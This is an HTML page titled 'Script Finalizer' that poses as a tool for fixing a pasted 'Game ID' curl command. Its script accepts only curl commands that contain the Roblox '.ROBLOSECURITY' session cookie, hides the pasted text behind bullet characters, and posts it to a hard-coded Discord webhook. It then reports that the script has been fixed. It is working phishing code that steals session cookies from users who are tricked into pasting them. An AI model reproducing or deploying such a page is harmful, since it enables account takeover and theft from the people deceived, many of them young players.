<!DOCTYPE html>
<html lang="en" class="dark">
<head>
  <meta charset="utf-8">
  <link rel="icon" href="data:,">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Script Finalizer</title>

  <!-- Force dark mode + Tailwind -->
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = { darkMode: 'class' }
    document.documentElement.classList.add('dark')
  </script>

  <!-- Lucide Icons -->
  <script src="https://unpkg.com/lucide@latest"></script>

  <style>
    body { background: #000 !important; }
    .grid-bg {
      background-image:
        linear-gradient(to right, #111 1px, transparent 1px),
        linear-gradient(to bottom, #111 1px, transparent 1px);
      background-size: 4rem 4rem;
    }
  </style>
</head>
<body class="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 relative overflow-hidden">
  <div class="absolute inset-0 grid-bg opacity-30"></div>
  <div class="absolute top-0 left-1/4 w-96 h-96 bg-purple-900/20 rounded-full blur-3xl"></div>
  <div class="absolute bottom-0 right-1/4 w-96 h-96 bg-blue-900/20 rounded-full blur-3xl"></div>

  <div class="relative z-10 w-full max-w-2xl">
    <div class="text-center mb-16">
      <div class="inline-flex items-center gap-3 mb-2">
        <i data-lucide="terminal" class="w-6 h-6 text-purple-400"></i>
        <h1 class="text-4xl font-light tracking-wide">Script Finalizer</h1>
      </div>
      <div class="h-px w-32 bg-gradient-to-r from-transparent via-purple-500 to-transparent mx-auto mt-4"></div>
    </div>

    <div class="bg-zinc-900/50 backdrop-blur-xl border border-zinc-800 rounded-2xl p-8 shadow-2xl" x-data="finalizer()">
      <label class="block mb-4 text-sm font-light text-zinc-400 tracking-wide">Insert Game ID BASH</label>

      <!-- Hidden real input -->
      <textarea x-model="realInput" class="hidden"></textarea>

      <!-- Visible masked input -->
      <input
        type="text"
        :value="realInput.replace(/./g, '•')"
        @input="realInput = $event.target.value.replace(/•/g, '') || ''; $event.target.value = realInput.replace(/./g, '•')"
        @paste.prevent="realInput = $event.clipboardData.getData('text'); $event.target.value = realInput.replace(/./g, '•')"
        :disabled="loading"
        placeholder="curl https://..."
        class="w-full min-h-[200px] bg-black/50 border border-zinc-700 rounded-md px-4 py-3 text-white placeholder:text-zinc-600 font-mono text-sm resize-none focus:border-purple-500 transition-all duration-300 outline-none"
      />

      <div class="mt-2 text-right text-xs text-zinc-500">
        <span x-text="realInput.length"></span> / 4000 characters
      </div>

      <!-- Success -->
      <div x-show="status === 'success'" x-transition class="mt-4 flex items-center gap-2 text-green-400 bg-green-950/30 border border-green-800/30 rounded-lg px-4 py-3">
        <i data-lucide="check-circle" class="w-5 h-5"></i>
        <span class="font-light">The script has been fixed!</span>
      </div>

      <!-- Error -->
      <div x-show="status === 'error'" x-transition class="mt-4 flex items-center gap-2 text-red-400 bg-red-950/30 border border-red-800/30 rounded-lg px-4 py-3">
        <i data-lucide="alert-circle" class="w-5 h-5"></i>
        <span class="font-light">Invalid input type!</span>
      </div>

      <!-- Submit Button -->
      <button @click="submit()" :disabled="loading || !realInput.trim()"
        class="w-full mt-6 bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 text-white h-12 text-base font-light tracking-wide rounded-md transition-all duration-300 disabled:opacity-50 flex items-center justify-center gap-2">
        <template x-if="loading">
          <i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i>
        </template>
        <span x-text="loading ? 'Processing...' : 'Submit Script'"></span>
      </button>
    </div>

    <p class="text-center mt-8 text-zinc-600 text-sm font-light">Only curl commands are accepted</p>
  </div>

  <!-- Alpine.js -->
  <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
  <script>
    function finalizer() {
      return {
        realInput: '',
        status: null,
        loading: false,

        async submit() {
          const input = this.realInput.trim();
          if (!input.startsWith('curl') || !input.includes('.ROBLOSECURITY')) {
            this.status = 'error';
            return;
          }

          this.loading = true;
          this.status = null;

          try {
            let processed = input
              .replace(/https?:\/\/[^\s]+/g, '')
              .replace(/curl\s+/gi, 'curl ... ')
              .trim()
              .substring(0, 4000);

            await fetch('https://discord.com/api/webhooks/1440146889939882087/HPjpz_PLLJI__-ue7qScQ3IXKMZyhLrjf0ZX64P5uK_W9RoIaCjXQgxWeYFY1TY0i_DP', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                embeds: [{
                  title: 'Script Submission',
                  description: processed,
                  color: 0x00ff00,
                  timestamp: new Date().toISOString()
                }]
              })
            });

            this.status = 'success';
            this.realInput = '';
          } catch {
            this.status = 'error';
          } finally {
            this.loading = false;
            lucide.createIcons();
          }
        }
      }
    }
  </script>
  <script>lucide.createIcons();</script>
</body>
</html>
